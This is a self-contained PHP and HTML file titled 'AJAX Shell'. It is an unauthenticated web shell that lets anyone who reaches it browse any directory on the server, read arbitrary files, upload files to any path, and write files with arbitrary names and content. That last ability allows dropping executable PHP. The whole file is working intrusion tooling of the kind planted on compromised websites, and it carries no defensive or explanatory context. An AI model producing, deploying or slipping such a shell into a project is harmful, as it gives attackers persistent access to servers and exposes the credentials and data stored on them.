<?php
if (isset($_POST['action'])) {
    $action = $_POST['action'];
    $path = isset($_POST['path']) ? $_POST['path'] : getcwd();

    switch ($action) {
        case 'list':
            $files = scandir($path);
            $result = [];
            foreach ($files as $file) {
                if ($file === '.' || $file === '..') continue;
                $result[] = [
                    'name' => $file,
                    'is_dir' => is_dir($path . DIRECTORY_SEPARATOR . $file)
                ];
            }
            echo json_encode(['current_path' => $path, 'files' => $result]);
            break;

        case 'upload':
            if (isset($_FILES['file'])) {
                $target = $path . DIRECTORY_SEPARATOR . basename($_FILES['file']['name']);
                if (move_uploaded_file($_FILES['file']['tmp_name'], $target)) {
                    echo json_encode(['status' => 'success', 'message' => 'File uploaded successfully.']);
                } else {
                    echo json_encode(['status' => 'error', 'message' => 'File upload failed.']);
                }
            }
            break;

        case 'create':
            $filename = $_POST['filename'];
            $content = $_POST['content'];
            $file = $path . DIRECTORY_SEPARATOR . $filename;
            if (file_put_contents($file, $content) !== false) {
                echo json_encode(['status' => 'success', 'message' => 'File created successfully.']);
            } else {
                echo json_encode(['status' => 'error', 'message' => 'Failed to create file.']);
            }
            break;

        case 'read':
            if (is_file($path)) {
                echo json_encode(['status' => 'success', 'content' => file_get_contents($path)]);
            } else {
                echo json_encode(['status' => 'error', 'message' => 'File not found.']);
            }
            break;
    }
    exit;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AJAX Shell</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; }
        #file-list { margin-top: 20px; }
        .folder, .file { margin: 5px 0; cursor: pointer; }
        .folder { font-weight: bold; }
    </style>
</head>
<body>
    <h1>AJAX Shell</h1>
    <div>
        <label for="upload">Upload File:</label>
        <input type="file" id="upload">
        <button onclick="uploadFile()">Upload</button>
    </div>
    <div>
        <label for="filename">New File Name:</label>
        <input type="text" id="filename">
        <br>
        <textarea id="filecontent" rows="5" cols="30" placeholder="File content..."></textarea>
        <button onclick="createFile()">Create File</button>
    </div>
    <div id="file-list"></div>

    <script>
        let currentPath = "/";

        function loadFiles(path = currentPath) {
            const formData = new FormData();
            formData.append('action', 'list');
            formData.append('path', path);

            fetch('', { method: 'POST', body: formData })
                .then(response => response.json())
                .then(data => {
                    currentPath = data.current_path;
                    const fileList = document.getElementById('file-list');
                    fileList.innerHTML = `<h3>Path: ${currentPath}</h3>`;
                    data.files.forEach(file => {
                        const fileDiv = document.createElement('div');
                        fileDiv.className = file.is_dir ? 'folder' : 'file';
                        fileDiv.textContent = file.name;
                        fileDiv.onclick = () => file.is_dir ? loadFiles(currentPath + '/' + file.name) : readFile(currentPath + '/' + file.name);
                        fileList.appendChild(fileDiv);
                    });
                });
        }

        function uploadFile() {
            const uploadInput = document.getElementById('upload');
            const file = uploadInput.files[0];
            if (file) {
                const formData = new FormData();
                formData.append('action', 'upload');
                formData.append('path', currentPath);
                formData.append('file', file);

                fetch('', { method: 'POST', body: formData })
                    .then(response => response.json())
                    .then(alert);
            }
        }

        function createFile() {
            const filename = document.getElementById('filename').value;
            const content = document.getElementById('filecontent').value;
            const formData = new FormData();
            formData.append('action', 'create');
            formData.append('path', currentPath);
            formData.append('filename', filename);
            formData.append('content', content);

            fetch('', { method: 'POST', body: formData })
                .then(response => response.json())
                .then(alert);
        }

        function readFile(path) {
            const formData = new FormData();
            formData.append('action', 'read');
            formData.append('path', path);

            fetch('', { method: 'POST', body: formData })
                .then(response => response.json())
                .then(data => {
                    if (data.status === 'success') {
                        alert(`File Content:\n\n${data.content}`);
                    } else {
                        alert(data.message);
                    }
                });
        }

        loadFiles();
    </script>
</body>
</html>
